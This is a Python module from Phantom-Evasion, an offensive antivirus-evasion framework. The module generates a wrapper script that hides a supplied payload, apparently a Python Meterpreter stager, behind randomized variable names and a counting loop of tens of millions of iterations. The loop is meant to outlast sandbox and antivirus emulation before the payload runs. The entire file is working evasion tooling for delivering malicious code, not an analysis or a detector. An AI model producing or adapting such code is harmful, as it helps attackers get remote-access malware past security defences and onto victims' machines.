
     ########################################################################################
     #                                                                                      #
     #    This file is part of Phantom-Evasion.                                             #
     #                                                                                      #
     #    Phantom-Evasion is free software: you can redistribute it and/or modify           #
     #    it under the terms of the GNU General Public License as published by              #
     #    the Free Software Foundation, either version 3 of the License, or                 #
     #    (at your option) any later version.                                               #
     #                                                                                      #
     #    Phantom-Evasion is distributed in the hope that it will be useful,                #
     #    but WITHOUT ANY WARRANTY; without even the implied warranty of                    #
     #    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the                     #
     #    GNU General Public License for more details.                                      #
     #                                                                                      #  
     #    You should have received a copy of the GNU General Public License                 #
     #   along with Phantom-Evasion.  If not, see <http://www.gnu.org/licenses/>.           #
     #                                                                                      #
     ########################################################################################

import random
import random, string
import sys
sys.path.append("Modules/payloads/auxiliar")
import usefull


Pytherpreter = sys.argv[1]
Filename = sys.argv[2] 

Randflag = usefull.varname_creator()
Randcounter = usefull.varname_creator()
Randbig = str(random.randint(60000000,120000000)) 
Hollow_code = ""
Hollow_code += Randcounter + " = 0\n"
Hollow_code += Randflag + " = 0\n"
Hollow_code += "while " + Randcounter + " < " + Randbig + ":\n"
Hollow_code += "    " + Randflag + " += 1\n"
Hollow_code += "    if " + Randflag + " == " + Randbig + ":\n"
Hollow_code += "        " + Pytherpreter + "\n"
Hollow_code = Hollow_code.encode('utf-8') 

with open(Filename,'wb') as f:
    f.write(Hollow_code)

